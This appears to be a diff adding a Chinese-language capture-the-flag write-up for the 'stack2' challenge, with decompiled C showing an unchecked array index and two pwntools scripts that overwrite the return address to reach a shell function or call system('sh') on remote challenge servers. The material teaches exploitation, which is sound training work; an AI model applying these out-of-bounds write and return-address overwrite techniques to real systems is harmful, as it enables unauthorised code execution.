@@ -448,3 +448,151 @@ conn.sendline(payload2)
 conn.interactive()
 print(conn.recvall())
 ```
+
+### stack2
+来源： XCTF 4th-QCTF-2018
+
+checksec,除了pie都开了。ida分析
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax
+  unsigned int v5; // [esp+18h] [ebp-90h]
+  unsigned int v6; // [esp+1Ch] [ebp-8Ch]
+  int v7; // [esp+20h] [ebp-88h]
+  unsigned int j; // [esp+24h] [ebp-84h]
+  int v9; // [esp+28h] [ebp-80h]
+  unsigned int i; // [esp+2Ch] [ebp-7Ch]
+  unsigned int k; // [esp+30h] [ebp-78h]
+  unsigned int l; // [esp+34h] [ebp-74h]
+  char v13[100]; // [esp+38h] [ebp-70h]
+  unsigned int v14; // [esp+9Ch] [ebp-Ch]
+
+  v14 = __readgsdword(0x14u);
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+  v9 = 0;
+  puts("***********************************************************");
+  puts("*                      An easy calc                       *");
+  puts("*Give me your numbers and I will return to you an average *");
+  puts("*(0 <= x < 256)                                           *");
+  puts("***********************************************************");
+  puts("How many numbers you have:");
+  __isoc99_scanf("%d", &v5);
+  puts("Give me your numbers");
+  for ( i = 0; i < v5 && i <= 99; ++i )
+  {
+    __isoc99_scanf("%d", &v7);
+    v13[i] = v7;
+  }
+  for ( j = v5; ; printf("average is %.2lf\n", (v9 / j)) )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        while ( 1 )
+        {
+          puts("1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit");
+          __isoc99_scanf("%d", &v6);
+          if ( v6 != 2 )
+            break;
+          puts("Give me your number");
+          __isoc99_scanf("%d", &v7);
+          if ( j <= 0x63 )
+          {
+            v3 = j++;
+            v13[v3] = v7;
+          }
+        }
+        if ( v6 > 2 )
+          break;
+        if ( v6 != 1 )
+          return 0;
+        puts("id\t\tnumber");
+        for ( k = 0; k < j; ++k )
+          printf("%d\t\t%d\n", k, v13[k]);
+      }
+      if ( v6 != 3 )
+        break;
+      puts("which number to change:");
+      __isoc99_scanf("%d", &v5);
+      puts("new number:");
+      __isoc99_scanf("%d", &v7);
+      v13[v5] = v7; // 这里未检查数组长度，存在数组越界，直接修改EIP到hackhere => 0x0804859B
+    }
+    if ( v6 != 4 )
+      break;
+    v9 = 0;
+    for ( l = 0; l < j; ++l )
+      v9 += v13[l];
+  }
+  return 0;
+}
+```
+
+exp: 
+```python
+#coding:utf8
+ 
+from pwn import *
+# context.log_level = 'debug'
+ 
+process_name = './fcca8ceb507544d1bd9c4a7925907a1d'
+# p = process(process_name)
+p = remote('111.198.29.45', 30172)
+ 
+ 
+hackhere = [0x9b, 0x85, 0x04, 0x08]  #0x0804859B
+write_offset = 0x84
+ 
+def change_number(offset, value):
+  p.sendlineafter('5. exit', '3')
+  p.sendlineafter('which number to change:', str(offset))
+  p.sendlineafter('new number:', str(value))
+ 
+p.sendlineafter('How many numbers you have:', '1')
+p.sendlineafter('Give me your numbers', '1')
+for i in range(4):
+  change_number(write_offset+i, hackhere[i])
+ 
+p.sendlineafter('5. exit', '5')
+ 
+ 
+p.interactive()
+```
+提示程序中没有/bin/sh 但是有/bin/bash,构造system(sh)
+
+sh所在的地址位0x8048980 + 7 （空过前面的/bin/ba 读取sh），或者 ROPgadget --binary stack2 --string 'sh'
+
+```python
+from pwn import *
+# p = process('./pwn_score03_stack2')
+p = remote('220.249.52.133', 37131)
+ 
+hackhere = [0x9b, 0x85, 0x04, 0x08]  #0x0804859B
+write_offset = 0x84
+system_addr = [0x50, 0x84, 0x04, 0x08] # 0x08048450
+sh_addr = [0x87, 0x89, 0x04, 0x08]  # 0x08048987
+ 
+def change_number(offset, value):
+  p.sendlineafter('5. exit', '3')
+  p.sendlineafter('which number to change:', str(offset))
+  p.sendlineafter('new number:', str(value))
+ 
+p.sendlineafter('How many numbers you have:', '1')
+p.sendlineafter('Give me your numbers', '1')
+for i in range(4):
+  change_number(write_offset+i, system_addr[i])
+ 
+write_offset += 8
+for i in range(4):
+  change_number(write_offset+i, sh_addr[i])
+ 
+ 
+p.sendlineafter('5. exit', '5')
+ 
+ 
+p.interactive()
+```
+https://bbs.secgeeker.net/thread-1430-1-1.html
